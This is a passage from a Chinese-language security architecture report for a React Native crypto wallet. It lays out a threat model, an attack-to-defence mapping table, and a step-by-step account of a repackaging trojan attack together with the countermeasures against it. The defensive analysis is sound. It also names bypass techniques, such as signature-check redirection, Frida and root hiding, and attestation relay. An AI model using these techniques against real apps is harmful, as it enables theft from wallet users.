| Bybit | 2025-02 | **约 $1.5B**：Safe{Wallet} 开发者机器被社工 → S3 前端 JS 被注入 → 多签签名者盲签被篡改交易[^169^] | 「合约没问题、多签没问题，前端才是攻击面」——OTA/前端发布管线必须与私钥同级防护 |

**分析**：三个案例拼出完整的攻击链图谱。chalk-debug 证明投毒者的目标画像就是「加密货币钱包用户」——payload 不是泛泛窃密，而是专门重写钱包地址，NexVault 的用户群正是其猎物 [P 需求]。Shai-Hulud 的 SLSA L3 伪造把「看 attestation 就行」的偷懒方案证伪：信任必须落在「安装时最小权限」（ignore-scripts）与「时间上冷却」（min-release-age）这类不依赖上游诚实的本地控制上，而非上游出具的自证文件。Bybit 则把损失量级钉死——$1.5B 的入口不是密码学被破，而是前端 JS 被替换，这直接论证了本章两条红线的等价性：OTA 发布管线（§5.2 代码签名）与 npm 依赖管线（本节门禁）是同一条「JS 送达用户」的供应链，任何一环失守后果相同。因此这套门禁不是合规装饰，而是与 §5.2.2 代码签名并列的 P 级控制；凡降级（如为装某个带 postinstall 的依赖开白名单）必须走与私钥操作同级的双人审批。

---

## 第6章 威胁模型与攻击-防御映射

> 本章是全报告安全叙事的收口章。所有防御机制均按三级标注：**[P] 已实现防护**（在原型/定案架构内真实落地，有密码学、硬件或系统强制语义）/ **[C] 仅提高攻击成本**（可被足够耐心、已持高权限的攻击者绕过，价值在于拉长攻击时间与产出风险信号）/ **[S] 占位接口**（接口或流程存在，实质防护未落地，仅用于演示或注册动作）。本章严格执行一条纪律：**禁止把 [C] 写成 [P]**。据 dim09 的逐项核实，除「检测信号与密钥派生 fail-closed 耦合」这一架构控制外，本系统一切端上检测均为 [C]——这不是缺陷陈述，而是对客户端 RASP 能力边界的诚实定位，与 OWASP MASVS-R 的同口径一致[^87^]。

### 6.1 范围与资产定义

#### 6.1.1 资产分级

威胁建模的第一步是承认资产并不等价。NexVault 的资产按「泄露/失控后的不可逆程度」分四级：

| 级别 | 资产 | 失控后果 | 保护基线 |
|---|---|---|---|
| A1（最高） | BIP39 助记词、secp256k1 私钥、seed/链码 | 资产即时、不可逆、无申诉渠道地全损 | 私钥不出 native；Keystore/StrongBox AES-256-GCM wrap + per-use 生物识别绑定；内存驻留 ≤ 单次签名调用；Web 端结构性不持有 [P] |
| A2 | 签名能力（在未授权交易上产出有效签名的能力） | 不丢私钥但丢资产（盲签、篡改收款地址） | 交易确认页 native 渲染 + 关键字段校验；设备证明门控；EIP-155 chainId 编入签名 [P]/[C] 组合 |
| A3 | 会话与完整性（API 会话、设备绑定 P-256 密钥、OTA 更新通道、JS bundle） | 伪造请求、推送恶意更新、误导用户 | RFC 9421 请求签名 + nonce 防重放；EAS Update 代码签名；TLS SPKI pinning [P]/[C] |
| A4（最低） | 可用性（服务可达、升级通道畅通） | 拒用、间接逼用户迁移到不安全路径 | 优雅降级、fail-open 于读 / fail-closed 于写密钥面 [C] |

**分析**：分级决定防御资源的分配方向。A1/A2 级资产的共同特征是「链上不可撤回」——签名一旦广播，服务端无法拦截、交易所无法撤销，因此 A1/A2 的防线必须落在客户端架构与硬件门禁上，而不是事后风控；A3 级资产则有服务端可验证、可吊销、可回滚的余地，允许把更多判定放在服务端完成（Play Integrity decodeIntegrityToken、nonce 原子去重）；A4 级刻意排最后，因为冷钱包场景下「因可用性故障逼用户去下载来路不明的安装包」本身就是攻击面——这直接决定了 6.5 节「不硬退出」的处置哲学。换言之，资产分级不是文档装饰，它单向决定了：哪些层可以 fail-open（读），哪些层必须 fail-closed（写密钥面）。

#### 6.1.2 攻击者画像

| 画像 | 能力 | 目标 | 本架构的针对性 |
|---|---|---|---|
| 远程供应链投毒者 | 投毒 npm 依赖、劫持构建流水线、注入 Web bundle | 批量窃取地址重写 / 密钥（2025-09 chalk/debug 事件：18 个周下载 20 亿次的包被注入 window.ethereum 钩子，存活约 2 小时[^73^]；Shai-Hulud 蠕虫波及 700+ 包[^170^]；Trust Wallet Chrome 扩展 v2.68 被投毒致 2500+ 钱包失窃 $8.5M，助记词被伪装成遥测数据外泄[^171^]） | Web 不持私钥 [P]；ignore-scripts + lockfile 钉版 + min-release-age + Socket 行为扫描（过程控制，[C]） |
| 本地重打包木马作者 | apktool 解包、植入上报逻辑、自签重分发（钓鱼网站/三方商店） | 窃助记词/私钥、篡改交易 | 私钥不出 native → 无明文可上报 [P]；native 签名指纹自检 + 服务端 attestation 拒绝 [C]+[P] 组合（见 6.3） |
| 拿到已 root 设备的攻击者 | 内核态读写、Frida 注入、dump 内存、hook 一切用户态 | 提取签名窗口内的明文、静默签名 | fail-closed 密钥派生耦合 [P]；per-use 生物识别绑定（无法静默使用 wrap key）[P]；检测层全部降为 [C] 信号 |
| 恶意 DApp / 钓鱼 | 伪造 WalletConnect 会话、UI 仿冒、恶意 RPC 返回伪造余额/状态 | 诱导签有害交易 | 确认页 native 显示收款地址/金额/chainId 并校验 [P]（显示层）；域名与会话元数据展示；服务端风控 [C] |

**分析**：四类画像对应四个完全不同的防御重心，混为一谈是钱包威胁模型最常见的错误。供应链投毒者是**规模化**攻击者（要的是命中率而非单点深度），对其最有效的防御是结构性收窄——Web 端代码库不含私钥路径，注入代码「无钥可偷」；重打包作者是**分发链**攻击者，防御重心在「验真」而非「检测」；已 root 设备攻击者是本模型承认**不可完全防御**的最强画像——防御目标降级为「不释放密钥 + 不留静默签名能力 + 留下遥测信号」；恶意 DApp 攻击的是**用户的判断**而非代码，唯一有效的防线是「所见即所签」的 native 确认页。任何声称单点 RASP 能覆盖全部四类画像的方案，都是在把 [C] 卖成 [P]。

#### 6.1.3 信任边界（文字描述）

系统自上而下存在五道信任边界，跨边界的每一次数据流动都必须显式受控：

1. **JS 层（Hermes 运行时）**：最低信任域。Hermes 字节码可被 hermes-decomp 等工具还原为结构化 JS（支持 v40–v99，2026 年还附带了 MCP server 供 AI 辅助逆向）[^10^]，故「Hermes = 明文」是建模前提而非风险提示。JS 层只允许接触：地址、公钥、密文 blob、opaque handle、ArrayBuffer 形态的签名结果。
2. **native 层（Kotlin/Swift/C++，含 libsecp256k1）**：密钥明文的唯一合法驻留域。JS↔native 边界只传 digest 与句柄；签名在该域内闭环；驻留 ≤ 单次调用并显式 zeroize。已知限制：iOS 侧 `mlock` 无语义保证，防 swap 依赖系统加密 + 短时驻留补偿，列为真机验证项。
3. **TEE/SE 层（Keystore/KeyMint、StrongBox、Secure Enclave）**：wrap key 与设备绑定密钥的持有域。注意 TEE 不是绝对信任锚——QSEE/Samsung/华为 Keymaster TA 均有历史漏洞（如 CVE-2021-25444 IV 重用），故 StrongBox > TEE > 软件的分级探测与「绝不静默降级软件」纪律必须保留[^172^]。
4. **Web 端**：无 attestation 能力（Web Environment Integrity 提案已被撤回）、无应用层 pinning 能力（HPKP 已移除）、与任意第三方脚本共享 JS 执行环境。定位 = 低信任只读端，`platform=web, assurance=low` 服务端标记。
5. **服务端**：完整性判定与风控裁决的唯一合法位置。Play Integrity token、Key Attestation 证书链、App Attest assertion 全部在服务端验证——root 设备上的本地判定可被伪造，「客户端自检 + 服务端复核」中前者只是信号[^173^]。

#### 6.1.4 简化 STRIDE 套用

| STRIDE | 在本系统的具体形态 | 主防御 | 级别 |
|---|---|---|---|
| Spoofing 仿冒 | 重打包 app 仿冒正品、伪造 DApp 会话、伪造 RPC 节点 | 签名指纹自检 + Play Integrity/App Attest + 服务端验签 | [C]+[P] |
| Tampering 篡改 | JS bundle 篡改、OTA 包篡改、请求 body 篡改、内存补丁 | v2/v3 整包签名 + bundle 哈希自检 + OTA 代码签名 + Content-Digest | [P]（通道）/[C]（端上自检） |
| Repudiation 抵赖 | 用户否认签名操作、设备否认 API 调用 | 设备绑定密钥请求签名（keyid + nonce）、服务端风控台账 | [P] |
| Information Disclosure 信息泄露 | 内存 dump 私钥、剪贴板/截屏窃取助记词、日志泄漏 | 私钥不出 native + zeroize + FLAG_SECURE + 剪贴板禁令 | [P]/[C] |
| Denial of Service 拒绝服务 | pin 过期锁死、attestation 服务停机、恶意更新推坏包 | 双 SPKI 备用 pin、L5 降级档、OTA 崩溃自动回滚内嵌包 | [C] |
| Elevation of Privilege 提权 | root/越狱后滥用 app 内能力、恶意进程冒用 app 身份调 Keystore | per-use 生物识别绑定（confused deputy 防御）、fail-closed 门控 | [P] |

**分析**：STRIDE 在此处的价值不是罗列，而是暴露一个结构性事实——六个类别中，**有三类（T 通道侧、R、E）的主要防线具有 [P] 级语义，而它们全部来自架构决策（代码签名、设备绑定密钥、硬件门禁）而非检测**。反之，依赖端上检测才能覆盖的条目（S 的重打包仿冒、D 的内存 dump）都只能给到 [C]。这解释了为什么本报告反复强调「架构红线比任何单点检测值钱」：检测回答的是「环境脏不脏」，而 2026 年的对抗栈（SukiSU/SUSFS 内核级隐藏、Dopamine「按需不注入」）已证明这个问题在端上没有可靠答案[^104^]；架构回答的是「脏了又能怎样」——私钥不在 JS、签名要生物识别、密钥派生与证明 fail-closed，攻击者拿到一个「干净假象」后依然无利可图。

### 6.2 攻击-防御映射总表

下表为本章程式化核心。「层级」指防御生效的架构层（JS / native / TEE-SE / 服务端 / 平台 / 流程）；级别标注遵循本章开头的三级约定，凡 [C] 均在残余风险列给出 2026 年已知的绕过路径。

| # | 攻击向量 | 防御机制 | 层级 | 级别 | 残余风险（2026 现状） |
|---|---|---|---|---|---|
| 1 | 重打包植入上报木马 | 私钥不出 native（无明文可窃）+ native signing block 自解析（证书 SHA-256 编译期嵌入 .so，拆字节异或重建）+ inode 交叉校验 + fail-closed 不派生密钥 + 服务端 attestation 拒绝未登记指纹 | native / 服务端 | **[P]（架构）+ [C]（自检）** | 定向攻击者 hook libc open 把读取重定向到 assets 内的原包[^96^]；放弃窃钥改为篡改 UI（见 6.3） |
| 2 | Frida 运行时 hook | 多信号检测：端口/D-Bus、maps/fd/线程名、rwxp 段、inline hook 序言字节自检（ARM64 `B` 指令 0x14xxxxxx）+ per-use 生物识别使「hook 到签名调用也无法静默通过」 | native / TEE-SE | [C]（检测）+ [P]（生物门禁） | brida 式重编译改名废掉全部基于名字的信号；Gadget 模式无 server；攻击者先定位并 patch 自检函数本身 |
| 3 | Magisk/Zygisk/SUSFS 隐藏 root | mounts/mountinfo 多源交叉、mount/PID namespace 失配、syscall errno 偏离、APatch /debug_ramdisk 特征；自研 native 模块，不引 RootBeer 作唯一依据[^89^] | native | [C] | 攻击面已下沉 LKM 级，用户态检测对 SUSFS 接近免疫；承认漏报，靠 fail-closed 保住密钥 |
| 4 | Hermes 字节码静态分析 | 架构上 JS 层无秘密可分析（密钥/判定逻辑全部 native 化）+ bundle 哈希自检 + roadmap：o-mvll 混淆检测 so | JS / native | **[P]（无密可泄）** + [C]（自检/混淆） | hermes-decomp 已可还原结构化 JS[^10^]；内存补丁 Hermes 解释器绕过静态校验 |
| 5 | OTA 包篡改 | EAS Update 代码签名：RSA `rsa-v1_5-sha256` 签 manifest，私钥本地不出机，客户端用构建期内嵌证书验签，失败静默拒绝加载；官方明确「甚至 EAS 自己」无法篡改[^19^] | 服务端 / native | **[P]** | 签名私钥保管是流程风险；root 设备上可 patch 本地校验器——但此时本地签名自检同样失败，不派生密钥，攻击无收益 |
| 6 | API 重放 | RFC 9421 风格请求签名：`@method/@authority/@path/@query/content-digest + created/expires(60s)/nonce/keyid`，设备绑定 P-256 密钥（SE/Keystore 内不可导出），服务端 nonce 原子去重 + 业务 Idempotency-Key[^138^] | TEE-SE / 服务端 | **[P]** | Web 端降级为 WebCrypto 非导出 key，assurance=low，不防 XSS 调起 sign() |
| 7 | MITM | 自有 API 域名双 SPKI pin（当前 + 备用，不 pin 根 CA），pin mismatch fail-closed、无「继续并绕过」按钮；不 pin 第三方 RPC/CDN[^128^] | native | **[P]（对纯网络攻击者）/ [C]（对已 root 设备）** | root 设备可 hook 校验函数；用户自装恶意根证书 + 本地代理属已妥协环境，归入画像三处理 |
| 8 | 剪贴板/截屏窃取 | 助记词/私钥路径完全禁止剪贴板；地址复制加 `EXTRA_IS_SENSITIVE`[^174^]；`expo-screen-capture` 在敏感页设 FLAG_SECURE（Android 含最近任务页空白）/ iOS app switcher 毛玻璃[^27^] | native / 系统 | **[P]（未 root 设备，系统强制）/ [C]（root 设备）** | 剪贴板 60 分钟自动清空非默认保证；iOS 无全局敏感标记；root 下 FLAG_SECURE 可被 hook |
| 9 | 供应链 npm 投毒 | `.npmrc`：ignore-scripts=true、allow-git=none、min-release-age=7d（≥7 天冷静期）；CI 一律 `pnpm install --frozen-lockfile`；Socket 行为扫描拦 PR；密钥路径依赖最小化 + 升级双人 diff；Web bundle 构建期 lint 禁签名符号 | 流程 / 构建 | [C]（过程控制）+ **[P]（Web 无钥可偷的架构面）** | Mini Shai-Hulud 已产出带有效 SLSA L3 provenance 的恶意包——流水线本身被劫持时下游验证静默失效[^168^]；provenance 只作参考信号 |
| 10 | 钓鱼 DApp / 恶意 WalletConnect 会话 | 会话元数据（域名、chainId、方法）native 确认页展示；高价值操作 Classic attestation + 二次确认；Web 端仅只读，签名强制回手机 | native / 服务端 | [C]（识别）+ [P]（确认页所见即所签） | 用户被社工主动确认恶意交易属于社会工程残余，技术不可根除 |
| 11 | 恶意 RPC 返回（伪造余额/链状态/gas） | RPC 返回只用于展示与交易**构造输入**；签名内容（to/value/chainId/data）以 native 确认页呈现并经用户确认；chainId 编入 EIP-155 签名防跨链 replay；只读展示标注数据来源 | JS / native | [C] | 伪造「收款人 Ens 解析结果」类呈现攻击仍可能误导确认——确认页显示原始 hex 地址缓解 |
| 12 | 模拟器薅羊毛/批量伪造设备 | 生产包禁止模拟器持钥；Play Integrity VIRTUAL verdict 识别 + recentDeviceActivity LEVEL_1–4 检测 token 刷量 + deviceRecall bit 跟踪重装后设备[^175^][^176^] | 服务端 | [C] | deviceRecall 仍 beta；模拟器判定存在对抗（真机农场）；该威胁伤的是活动/空投预算而非持钥安全 |
| 13 | 无 GMS 设备降级攻击（伪装华为海外版绕过 Play Integrity） | 降级路径走 Key Attestation：验 Google Hardware Attestation Root 链 + challenge + rootOfTrust + attestationApplicationId + 吊销列表；降级档默认不给 STRONG 等价信任，标记风险 | 服务端 / TEE | [C] | attestation 中继攻击已实证（root 机转发 challenge 给干净真机代答）[^173^]；缓解=校验 appId + 会话内持续签名质询 + 地理/频率聚类 |

**分析**：通读十三行可归纳出本章最重要的一条结构性结论——**没有任何一行把端上检测列为唯一防线**。第 1、4、5、6、9 行之所以能达到 [P] 级语义，靠的都是「让攻击即使成功也无收益」的架构设计（无明文、无密钥路径、验签拒绝加载、设备绑定密钥不可导出），而不是「让攻击不成功」的检测。反过来，凡是防御主体落在端上检测的行（2、3、11、12），级别全部封顶在 [C]，且残余风险列均可写出 2026 年现成的公开绕过路径——brida 改名、SUSFS 内核过滤、真机农场、attestation 中继。这正呼应 Insight 5 的定位：端上检测层是「攻击成本定价器」，其价值在于把脚本小子级别的攻击者挡在门外、把定向攻击者拖进需要时间与人力的定制对抗，同时向服务端持续产出风险遥测；它不是、也不应被叙述为资金安全的兜底。资金安全的兜底只有三处：不释放密钥（fail-closed 耦合）、不静默签名（per-use 生物门禁）、用户看见再签（native 确认页）。

### 6.3 威胁案例深度论证：「重打包 + 明文上报 C&C」木马的完整攻击链推演

这是冷钱包最经典、也是最常被错误防御的场景。设攻击者能力为：可获取公开 APK、熟练使用 apktool/hermes-decomp、运营钓鱼分发站、可注册任何开发者身份。**目标：批量窃取用户助记词/私钥并上报 C&C 服务器。**

#### 攻击链逐步推演与本架构的逐层失效点

**Step 1：解包与代码理解。** 攻击者 `apktool d` 拿到 DEX 与 `assets/index.android.bundle`，用 hermes-decomp 将字节码还原为结构化 JS[^10^]。在传统 RN 钱包里，这一步直接读出助记词输入框处理、bip39 派生、AES 解密、网络上报的全部 JS 逻辑——**在本架构中，JS 层不存在这些符号**：vault-core 四个方法（`importMnemonic / deriveAddress / signDigest / destroy`）是 native local module，JS 只传 ArrayBuffer 与 opaque handle。攻击者读到的是「调用一个不可见的 native 黑盒」。*窃密面第一次失效：分析无密可析。*

**Step 2：植入上报逻辑。** 攻击者退而求其次：hook 不了逻辑就改逻辑——在 JS 层插入代码，把用户输入的助记词（导入页）或签名请求内容 POST 到 C&C。**但助记词导入的路径是：软键盘/词格 → JS 收集字符数组 → 立即以 ArrayBuffer 传入 `importMnemonic`，native 内派生、wrap、清零。** 攻击者可以在 JS 侧复制一份字符数组上报——这是本架构承认的真实残余面（导入瞬间 JS 短暂接触助记词字符）。缓解：自定义词格键盘（输入不经 EditText，逐字直送 native 缓冲）、缩短 JS 驻留。**更关键的失效点在下一步。**

**Step 3：重签名与分发。** 改完 bundle 必须重打包重签。APK v2/v3 整包签名覆盖 assets，改动 bundle 必然破坏原签名 → 攻击者只能用自己的证书自签。此时三重验真同时闭合：① 端上 native signing block 自解析（EOCD→"APK Sig Block 42"→ID `0x7109871a/0xF05368C0`→证书 DER→SHA-256 与编译期嵌入值 memcmp，不经 PackageManager，免疫 ApkSignatureKiller 类工具）指纹不符 → **fail-closed：不派生、不释放签名密钥，且按纪律不弹窗不日志**——木马在用户设备上连既有钱包都打不开，更谈不上窃私钥 [P]；② 服务端 Play Integrity `appIntegrity=UNRECOGNIZED_VERSION` + Key Attestation 的 `attestationApplicationId` 不含已登记签名指纹 → 拒绝注册新设备密钥、冻结写接口（L3 橙档）；③ Google Developer Verification 使攻击者必须以真实身份注册并提交签名 APK 才能正常分发——身份归因威慑（见 6.6）[^118^]。*窃密面第二次失效：木马包无法获得密钥材料，也无法接入服务端。*

**Step 4：假设攻击者绕过端上自检。** Guardsquare 记录的标准手法：原 APK 塞进 assets，hook libc `open`，RASP 打开 base.apk 时重定向到原包，校验全部通过[^96^]。本架构的对价设计：对已打开 fd 做 `fstat` 取 inode，与 `/proc/self/maps` 中 base.apk 映射行 inode 交叉比对；且自检结果以「污染式响应」参与密钥派生（校验失败的设备派生不出可用密钥）而非直接 abort——**即使全部检测点被逐一 hook，攻击者得到的仍是一个无法签名、无法注册、无法上报私钥（因为根本没有）的空壳** [P]（fail-closed 耦合）/ [C]（各检测点本身）。

#### 明确残余风险：攻击者改道「篡改收款地址 UI」

理性攻击者在上述链路全数失效后会放弃窃私钥，转向攻击链上唯一绕不过的环节——**用户的确认动作**：重打包木马把确认页显示的收款地址渲染成攻击者地址，用户生物识别一按即完成转账（Bybit $1.5B 事件的同构教训：合约没问题、多签没问题，被篡改的是前端，签名者盲签了被篡改的交易[^169^]）。Mitigation 组合：① 交易确认页由 native 渲染并直接展示 native 签名输入的原始字段（to 的 hex、value、chainId），所见即所签，JS 层注入的展示篡改无法影响 native 确认页 [P]（显示与签名同源）；② 重打包场景本身已被 Step 3 的验真链掐死——篡改 UI 的前提是能稳定分发并通过验真，这恰恰是本架构投入最重的环节；③ 服务端对收款地址做风险标注（新地址/黑名单/地址中毒模式）作为 [C] 级补充。**诚实结论：「用户在被完全控制的环境里、对着正确的 native 确认页主动确认一笔错误交易」属于社会工程残余风险，技术手段只能压缩不能归零——这也是为什么 A2 级资产的最后一道防线永远是用户教育。**

### 6.4 安全承诺分级总表

将全系统所有安全机制汇总为一表（机制 / 级别 / 依据章节）。这张表是本报告对外的「诚实边界声明」：面试或评审时，它展示的正是「我们知道哪些是真防护、哪些只是成本」。

| 机制 | 级别 | 依据章节 |
|---|---|---|
| 私钥不出 native：secp256k1 明文仅存在于 native 内存，驻留 ≤ 单次签名调用并 zeroize；JS 永不接触 | **[P]** | 第 3 章（§3.1 红线 1）、本章 6.3 |
| Web 端结构性不持私钥：依赖裁剪 + 构建期 lint，签名符号不进入 Web bundle | **[P]** | 第 3 章（§3.1 红线 2）、本章 6.1 |
| Keystore/StrongBox AES-256-GCM wrap key + per-use 生物识别绑定（`setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)`）；绝不静默降级软件 | **[P]**（硬件门禁层） | 第 3 章 §3.2 |
| iOS Keychain 生物识别 ACL（Secure Enclave 硬件强制）+ 可选 SE P-256 包裹 | **[P]**（门禁层） | 第 3 章 §3.3 |
| 检测信号与密钥派生 fail-closed 耦合：验真失败 = 不派生/不释放密钥，而非弹窗 | **[P]** | 本章 6.3、第 3 章 |
| 交易确认页 native 渲染 + 显示与签名同源字段校验 | **[P]**（显示层） | 本章 6.3 |
| OTA 代码签名（EAS Update / xprem 自建，客户端内嵌证书验签，失败拒绝加载） | **[P]** | 第 5 章 §5.2.2、本章 6.2#5 |
| API 请求签名防重放（RFC 9421 风格 + 设备绑定 P-256 + nonce 原子去重） | **[P]** | 第 4 章、本章 6.2#6 |
| TLS 双 SPKI pinning（自有 API 域名，fail-closed） | **[P] 对网络攻击者 / [C] 对已 root 设备** | 第 4 章、本章 6.2#7 |
| Play Integrity（主）+ Key Attestation（无 GMS 降级）双轨设备证明，判定在服务端 | [C]（STRONG 不硬卡；可中继） | 第 3 章 §3.8、本章 6.2#13 |
| App Attest（iOS）：attestKey 一次 + assertion 保护敏感请求[^86^] | [C] | 第 3 章 §3.8 |
| native 签名校验（signing block 自解析 + inode 交叉校验） | [C]（对工具党近似阻断） | 本章 6.2#1、dim09 §1a |
| JS bundle 哈希自检 | [C] | dim09 §1b |
| Root/Magisk/Zygisk/SUSFS 多向量检测（自研 native，不依赖 RootBeer 单一信号） | [C] | 本章 6.2#3、dim09 §1c |
| iOS 越狱检测（IOSSecuritySuite + 自补 /var/jb、dyld、sysctl） | [C]（Dopamine Hide Jailbreak 模式下必漏）[^104^] | dim09 §1d |
| 反调试（ptrace self-attach/TracerPid；iOS dlsym PT_DENY_ATTACH + sysctl） | [C]（教科书级可绕） | dim09 §1e |
| Frida 多信号检测 + inline hook 序言字节自检 | [C] | 本章 6.2#2、dim09 §1f |
| FLAG_SECURE 防截屏 + 剪贴板敏感路径禁令 | [P]（未 root，系统强制）/ [C]（root） | 第 3 章、本章 6.2#8 |
| 供应链门禁（ignore-scripts / lockfile 钉版 / min-release-age / Socket 扫描 / 双人 diff） | [C]（过程控制，无单点充分条件） | 第 5 章、本章 6.2#9 |
| o-mvll 控制流混淆 + 关键函数 VMP 化 | [S] → roadmap 第一阶段 [C] | dim09 §2b |
| 商用加固壳（DexGuard/Promon，触发条件制采购） | [S] | dim09 §2c |
| Google Developer Verification 注册 | [S]（注册动作）→ 生效后平台侧 [P]（仅身份归因） | 本章 6.6、dim09 §3 |
| Web 端 WebCrypto 非导出请求密钥 | [C]（assurance=low，不防 XSS 调起） | 第 4 章、本章 6.2#6 |
| 服务端风控台账 / deviceRecall bit 回写 / 地理频率聚类 | [C] | 第 3 章 §3.9 |

**分析**：全表 23 项机制中，[P] 级共 8 项，且全部落在三条主线上——**密钥材料的最小暴露面（不出 native、不驻留、硬件包裹）、密钥使用的在场证明（per-use 生物识别）、分发与通道的密码学验真（OTA 签名、请求签名、pinning）**。这三条主线的共同点是：其安全性不依赖「攻击者没发现防护代码在哪」，而依赖攻击者无法制造的物理事实（硬件不可导出、生物特征不在场、私钥不在他手里）。[C] 级 12 项全部为检测/信号/过程控制——它们的正确用法是组合计分、喂给服务端风险引擎、触发 L 级处置，任何一项被单独当作「防护」都是误标。[S] 级 3 项如实承认未落地，避免 roadmap 项在叙述中悄悄升格。这张表同时是审计友好产物：外部渗透测试或投资人尽调可直接按表逐项验证，[P] 项给密码学证据、[C] 项给绕过演示、[S] 项给排期——三种证据形态本身就是专业度的体现。

### 6.5 分级处置策略的对抗论证

**为什么不硬退出**——三条独立论据，每条单独成立：

1. **标准口径不要求**。OWASP MASVS-RESILIENCE-1 的原文口径是「对 root/越狱/hooking 环境做出反应，**either by alerting the user or terminating the app**」——告警即合规，硬退出从来只是可选项之一[^87^]。把「检测到 root 就退出」当成标准要求，是对 MASVS 的误读。
2. **误伤与对抗经济学**。root ≠ 恶意：海外市场的玩机用户、定制 ROM 用户是真实付费人群；而现代攻击（钓鱼 overlay、无障碍滥用、重打包分发）在非 root 设备上同样成立。硬封的净效果是误伤真实用户、消耗客服，并教会攻击者把 root 藏得更干净（Shamiko/Dopamine 的繁荣部分正是硬封策略喂出来的）。银行业实践（OneSpan 等）给出的范式是「root 单独是黄灯，root + hooking 框架才是红灯」的组合信号与功能级限制[^88^]。
3. **可绕过性使硬退出成为虚假承诺**。在已 root 设备上，「检测到 → exit()」这条路径本身就在攻击者的内核/注入能力覆盖范围内——hook 掉检测函数或 hook 掉 exit，硬退出即失效。真正不可被客户端 patch 掉的处置只有两种：**本地密钥可用性门控**（证明通过前，wrap key 因 fail-closed 耦合而不可用，链上签名能力实际冻结）与**服务端写接口门控**（广播中继、设备注册、风控确认拒绝服务）。客户端的「退出」只是 UI 层的姿态，密钥层的「不可用」才是实质。

**L0–L5 矩阵**：完整的「检测级别 × 功能面（A 只读浏览 / B 收款展示 / C 签名交易 / D 导出密钥 / E 改安全设置）」处置矩阵已在第 3 章 §3.9 定义（L0 绿 = STRONG + PLAY_RECOGNIZED 免 step-up；L4 红 = 无 verdict/root+hooking 迹象时 C/D/E 全禁、A 保留只读；L5 = attestation 服务不可用时 fail-open 于读、fail-closed 于写密钥面，不计入用户负面记录）。本章不再重复矩阵本体，仅强调其在威胁模型中的定位：**A/B 列的放行是刻意的**——它保留用户的自救通道（查看资产、转移到安全设备），符合「不硬退出」原则；而 C/D/E 列才是真正的资产防线，其「禁止」由密钥门控而非 UI 隐藏来执行。同时注意平台方口径与本策略同向：Google 提供 GET_INTEGRITY 应用内修复对话框引导用户自愈[^176^]，Apple 在 WWDC26 明确建议「attestation 被拒绝时优雅降级、评估风险后再考虑阻断」[^86^]——两大平台都在把「修复引导」确立为优于「封禁」的范式。

### 6.6 合规注记

**中国大陆：不面向、不上架、不承诺。** 依据中国对加密货币交易的禁令立场，本产品不在中国大陆上架、不提供下载、不做任何可用性承诺。工程落地：① 服务端按注册地区/分发渠道做 geo-fence，Play Integrity 依赖 GMS、Key Attestation 吊销列表校验依赖 `android.googleapis.com`，二者在中国大陆网络天然不可达，不作为对该区域的可用性缺陷处理；② 不集成面向中国大陆的 HMS 中国大陆区服务（华为海外版走 Key Attestation 降级属海外合规路径）；③ 隐私政策中如实披露设备级信号采集范围（deviceRecall、appAccessRisk 等属设备级而非个人标识，仍按 GDPR 口径披露）。本节与第 5 章分发策略、第 3 章 §3.9 分级处置决策表保持一致。

**海外辖区：简述而非法律意见。** 各辖区对非托管钱包的监管差异显著：FATF 旅行规则（Travel Rule）对 VASP 的转账信息随附义务主要针对托管方，非托管钱包在多数辖区不构成 VASP，但欧盟 MiCA/TFR、美国 FinCEN 提案等对「unhosted wallet」的申报阈值与对手方尽调要求各不相同且持续变动；若未来引入法币出入金、内置兑换或任何托管成分，合规定性将根本改变。本节为工程团队的辖区差异提示，**不构成法律意见**，上线前须由持牌律师按目标市场逐一确认。

**平台层合规时间表：Google Android Developer Verification。** 2026-09-30 起，巴西、印尼、新加坡、泰国四国的 GMS 认证设备上，经 7 家参与商店（Google Play、Galaxy Store、小米 GetApps、HONOR/OPPO/vivo 应用市场、Palm Store）分发的应用必须注册到已验证开发者，否则正常路径拒绝安装；官网 APK 直链与非参与商店首阶段豁免，但 **2027 年全球扩展将覆盖所有安装路径**[^118^]。对本产品的含义与行动：① 立即在（Android）Developer Console 注册官网分发的包名，提交签名证书 SHA-256 并上传同密钥签名的 challenge APK（约半天工作量，见第 5 章）；② 官网 APK 与 Play 版共用同一 EAS 托管 keystore，并冷备份——Developer Verification 时代密钥与开发者身份绑定，丢钥 = 丢分发资格；③ 必须理解该平台机制的边界：它只做**身份归因**（「机场查 ID 不查行李」），不审核包内容，挡不住「已注册开发者的包被重打包后由另一个已注册身份分发」——本地 native 签名校验仍是端上唯一兜底，平台验证与本地验真是互补而非替代（Insight 3）。

---

## 第7章 3天工期计划总览与风险

> 本章把前六章的技术定案落到一张可执行的 72 小时排期表上，回答三个问题：先做什么、每天凭什么过关、出了意外往哪退。人力配置为 1 名开发者（5 年 Android NDK、熟 Frida/Xposed、RN 初级、iOS 基础 Swift）+ AI 辅助编码；硬约束是 **72 小时产出可演示的三端原型（面试用途），任何 3 天内无法真机验证的方案一律进 roadmap，不占排期**。排期、任务 ID 与逐条验收命令的完整版见 `nexvault-rn-sdd/plans/3-day-implementation-plan.md`，本章为其总览与论证，细节不重复照抄[^177^]。
>
> 标注纪律沿用全书约定：**[P] 已实现防护 / [C] 仅提高攻击成本 / [S] 占位接口**；演示与文档中禁止把 [C] 级检测写成「防护」，这一纪律贯穿本章全部交付物清单[^178^]。

### 7.1 排期总览

#### 关键路径论证：为什么是 native 先行、UI 并行

3 天工期的排期逻辑由一条核心洞察（Insight 4）直接决定：**关键路径在 vault-core native 闭环，不在 UI**[^179^]。依据有三层。其一，六项原生能力中有 4 项（Keystore KV、FLAG_SECURE、manifest/Application 配置、签名读取）有成熟工程路径、当日可落，而 2 项（NDK C++ 化、Secure Enclave 通用密钥封装）工作量与不确定性都超出窗口，必须进 roadmap；其二，UI 层（Expo Router + NativeWind v4 + Reanimated 4.7 + FlashList v2 + TanStack Query/Zustand）全是成熟件，不存在技术验证风险，只有堆量工作；其三，vault-core 四方法（`importMnemonic`/`deriveAddress`/`signDigest`/`destroy`）是全项目唯一「自研密码学 + expo local module 首次封装」的高风险组合，一旦封装受阻会沿着依赖链拖垮 iOS 移植（T1.5）、安全 MVP（T3.2 与之 fail-closed 耦合）与端到端流程（T4.1）。因此排期的第一原则是 **Day1 上午即开工 vault-core Android Kotlin 实现，UI 骨架由并行线程推进**；native 封装卡顿超过半天（Day1 13:00 检查点）立即触发降级预案（7.4 风险 a）[^177^][^179^]。

